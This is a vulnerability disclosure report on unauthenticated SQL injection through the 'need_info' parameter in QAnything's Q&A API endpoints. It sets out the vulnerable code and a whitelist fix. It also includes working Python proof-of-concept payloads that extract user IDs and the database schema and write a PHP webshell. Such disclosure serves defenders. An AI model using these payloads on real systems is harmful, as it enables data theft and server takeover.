# Unauthenticated SQL Injection via `need_info` Parameter in Multiple Endpoints

## Package Manager

pip

## Version Affected

Latest (commit at time of analysis, 2026-03-12)

## Vulnerability Type

CWE-89: SQL Injection

## CVSS

9.8 (Critical) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

## Write-up

### Title

Unauthenticated SQL Injection via `need_info` Parameter in `get_random_qa`, `get_related_qa`, and `get_qa_info` Endpoints

### Description

The QAnything application contains a critical SQL injection vulnerability in multiple API endpoints that accept a user-controlled `need_info` parameter. This parameter is intended to specify which database columns to return, but it is directly interpolated into SQL SELECT statements without any sanitization or whitelist validation.

The most critical instance is in the `/api/local_doc_qa/get_random_qa` endpoint, which requires **no authentication whatsoever**.

**Vulnerable code flow:**

1. The `get_random_qa` endpoint receives `need_info` from the HTTP request body:

```python
# qanything_kernel/qanything_server/handler.py:1126
need_info = safe_get(req, 'need_info')
```

2. This is passed directly to `get_random_qa_infos()`:

```python
# qanything_kernel/qanything_server/handler.py:1132
qa_infos = local_doc_qa.milvus_summary.get_random_qa_infos(limit=limit, time_range=time_range, need_info=need_info)
```

3. In `get_random_qa_infos()`, the user-supplied list is joined and interpolated into the SQL query via f-string:

```python
# qanything_kernel/connector/database/mysql/mysql_client.py:766-767
need_info = ", ".join(need_info)
query = f"SELECT {need_info} FROM QaLogs WHERE timestamp BETWEEN %s AND %s ORDER BY RAND() LIMIT %s"
```

The same pattern exists in:
- `get_qalog_by_filter()` (mysql_client.py:692-694) — used by `get_qa_info` and `get_random_qa`
- `get_related_qa_infos()` (mysql_client.py:780-781) — used by `get_related_qa`
- `get_qalog_by_ids()` (mysql_client.py:734-735)

The `safe_get()` function (general_utils.py) only extracts the value from the request JSON — it performs **no sanitization**.

#### Proof of Concept

**1. Data Exfiltration — Extract all user IDs from the User table (no authentication required):**

```python
import requests

target = "http://localhost:8777"

# SQL Injection via need_info — extract user table data
payload = {
    "need_info": ["(SELECT GROUP_CONCAT(user_id SEPARATOR '|||') FROM User) as leaked_users"],
    "time_start": "2024-01-01",
    "time_end": "2026-12-31",
    "limit": 1
}

resp = requests.post(f"{target}/api/local_doc_qa/get_random_qa", json=payload)
print(resp.json())
# Response will contain: {"qa_infos": [{"leaked_users": "admin__1234|||user1__5678|||..."}]}
```

**2. Arbitrary Table Data Extraction:**

```python
# Extract database schema
payload = {
    "need_info": ["(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) as tables"],
    "time_start": "2024-01-01",
    "time_end": "2026-12-31",
    "limit": 1
}

resp = requests.post(f"{target}/api/local_doc_qa/get_random_qa", json=payload)
print(resp.json())
```

**3. Write-based attack (if MySQL user has FILE privilege):**

```python
# Write webshell (requires FILE privilege)
payload = {
    "need_info": ["(SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php') as pwned"],
    "time_start": "2024-01-01",
    "time_end": "2026-12-31",
    "limit": 1
}

resp = requests.post(f"{target}/api/local_doc_qa/get_random_qa", json=payload)
```

### Impact

- **Confidentiality**: HIGH — Attacker can extract all data from the MySQL database including user information, knowledge base contents, Q&A logs, and any other tables. No authentication required.
- **Integrity**: HIGH — Attacker can modify or delete database records via stacked queries or subquery-based UPDATE (depending on MySQL connector configuration).
- **Availability**: HIGH — Attacker can drop tables or corrupt data, causing service disruption.

## Occurrences

### Occurrence 1

- **Permalink**: https://github.com/netease-youdao/QAnything/blob/master/qanything_kernel/connector/database/mysql/mysql_client.py#L757-L771
- **Description**: `get_random_qa_infos()` — User-controlled `need_info` list is joined and directly interpolated into SELECT clause via f-string. Called from unauthenticated `get_random_qa` endpoint.

### Occurrence 2

- **Permalink**: https://github.com/netease-youdao/QAnything/blob/master/qanything_kernel/connector/database/mysql/mysql_client.py#L690-L697
- **Description**: `get_qalog_by_filter()` — Same pattern. Used by `get_qa_info` endpoint (partially authenticated) and internally.

### Occurrence 3

- **Permalink**: https://github.com/netease-youdao/QAnything/blob/master/qanything_kernel/connector/database/mysql/mysql_client.py#L773-L781
- **Description**: `get_related_qa_infos()` — Same pattern. Used by unauthenticated `get_related_qa` endpoint.

### Occurrence 4

- **Permalink**: https://github.com/netease-youdao/QAnything/blob/master/qanything_kernel/connector/database/mysql/mysql_client.py#L732-L736
- **Description**: `get_qalog_by_ids()` — Same pattern with `.format()` instead of f-string.

## Suggested Fix

```diff
--- a/qanything_kernel/connector/database/mysql/mysql_client.py
+++ b/qanything_kernel/connector/database/mysql/mysql_client.py
@@ -754,6 +754,9 @@ class KnowledgeBaseManager:
+    ALLOWED_QA_COLUMNS = frozenset({
+        "qa_id", "user_id", "bot_id", "kb_ids", "query", "model",
+        "product_source", "time_record", "history", "condense_question",
+        "prompt", "result", "retrieval_documents", "source_documents", "timestamp"
+    })
+
     def get_random_qa_infos(self, limit=10, time_range=None, need_info=None):
         if need_info is None:
             need_info = ["qa_id", "user_id", "kb_ids", "query", "result", "timestamp"]
+        need_info = [col for col in need_info if col in self.ALLOWED_QA_COLUMNS]
+        if not need_info:
+            need_info = ["qa_id"]
         if "qa_id" not in need_info:
             need_info.append("qa_id")
```

Apply the same whitelist validation to `get_qalog_by_filter()`, `get_related_qa_infos()`, and `get_qalog_by_ids()`.

**Verified:** After applying the whitelist, injected column names like `(SELECT ...)` are filtered out, and only valid column names are accepted.

## References

- https://cwe.mitre.org/data/definitions/89.html
- https://owasp.org/www-community/attacks/SQL_Injection
